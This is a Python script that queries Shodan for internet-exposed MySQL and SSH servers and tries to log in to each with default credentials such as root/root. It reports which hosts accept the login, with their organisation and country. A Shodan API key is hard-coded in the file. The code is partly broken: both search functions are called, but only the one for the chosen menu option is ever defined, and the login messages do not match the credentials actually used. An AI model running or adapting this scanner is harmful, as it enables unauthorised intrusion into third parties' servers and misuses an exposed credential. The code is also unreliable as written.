from curses import echo
from doctest import script_from_examples
from pprint import pprint
from pydbus import connect
from paramiko import SSHClient
from paramiko.ssh_exception import SSHException
from colorama import Fore, Back, Style
import paramiko

import var_dump
import shodan
import mysql.connector
import time
import sys

#shodan API key
SHODAN_API_KEY = "fD1T4vSYKQaQrtwuGy0Ya4odIOJ1eYs9"
api = shodan.Shodan(SHODAN_API_KEY)

input_type = input(Fore.MAGENTA + "What do you want to search for?\n\n1. Vulnerable servers\n\n")
if input_type == "1":
    input_type_server = input(Fore.MAGENTA + "What server do you want to target?\n1. Mysql\n2. Ssh\n\n")
    if input_type_server == "1":
            def searchMysql():
                try:
                    for i in range(0, 100):
                        print(Fore.GREEN + "\r[#]Searching for open mysql servers... " + str(i) + "%", end="")
                        time.sleep(0.01)
                    print(Fore.GREEN + "\r[#]Searching for open mysql servers... 100%")
                    time.sleep(1)
                    print("\n")
                    
                    results = api.search('mysql')
                    print('Results found: %s' % results['total'])
                    for result in results['matches']:
                        IP = result['ip_str']
                        PORT = result['port']                
                        ORG = result['org']
                        COUNTRY = result['location']['country_name']    
                        connectMysql(IP, PORT, ORG, COUNTRY)
                        print('\n')              
                    # var_dump.var_dump(IP, PORT, ORG, COUNTRY)
                except shodan.APIError as e:    
                    print('Error: %s' % e)

    elif input_type_server == "2":
            def searchSsh():
                try:
                    for i in range(0, 100):
                        print(Fore.GREEN + "\r[#]Searching for open ssh servers... " + str(i) + "%", end="")
                        time.sleep(0.01)
                    print(Fore.GREEN + "\r[#]Searching for open ssh servers... 100%")
                    time.sleep(1)
                    print("\n")
                    
                    results = api.search('ssh')
                    print('Results found: %s' % results['total'])
                    for result in results['matches']:
                        IP_SSH = result['ip_str']
                        PORT_SSH = result['port']                
                        ORG_SSH = result['org']
                        COUNTRY_SSH = result['location']['country_name']    
                        connectSsh(IP_SSH, PORT_SSH, ORG_SSH, COUNTRY_SSH)
                        print('\n')              
                    # var_dump.var_dump(IP, PORT, ORG, COUNTRY)
                except shodan.APIError as e:    
                    print('Error: %s' % e)
    else:
        print('\n' + Fore.RED + "[!]Error: Invalid input or range\n")
        sys.exit()
    
else:
    print("\n")
    print(Fore.RED + "[!]Invalid input type or range")
    print("\n")
    sys.exit()

    
    
#connects to weak mysql or ssh servers online

def connectMysql(IP, PORT, ORG, COUNTRY):
    # IP = IP.replace(".", ":")
    try:
    
        print (Fore.YELLOW +"\n[#]Connecting to " + IP + ":" + str(PORT) + "...")
        time.sleep(2)
        mydb = mysql.connector.connect(
            host=IP,
            port=PORT,
            user='user',
            passwd='root'
        )
        print("Connected to: " + IP)
        print("port: " + str(PORT))
        print("Version: " + mydb
        .get_server_info())
        print("\n")
        if mydb.is_connected():
            print("[#]Successfully connected to " + IP + ":" + str(PORT) + " with username: root and password: root")
            print("[#]Organization: " + ORG)
            print("[#]Country: " + COUNTRY)
            print("\n")
            mydb.close()
    except mysql.connector.Error as err:
        print("one error of so many errors: {}".format(err))
        pass    
    #if unput is 2 then run connectSsh()
    

def connectSsh(IP_SSH, PORT_SSH, ORG_SSH, COUNTRY_SSH):
    try:
        ssh = SSHClient()
        var_dump.var_dump(IP_SSH, PORT_SSH, ORG_SSH, COUNTRY_SSH)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(IP_SSH, PORT_SSH, username='root', password='root')
        
        print("[#]Successfully connected to " + IP_SSH + ":" + str(PORT_SSH) + " with username: root and password: root")
        print("[#]Organization: " + ORG_SSH)
        print("[#]Country: " + COUNTRY_SSH)

        ssh.close()
    except SSHException as e:
        print("[#]Error: ssh connection " + e)
        pass

searchSsh()
searchMysql()
#if not allowed to connect the mysql server is not public so not so vulnerable
        
    # var_dump.var_dump(IP, PORT)
    # connect(IP, PORT, ORG, COUNTRY)
    # connect(IP, PORT, ORG, COUNTRY)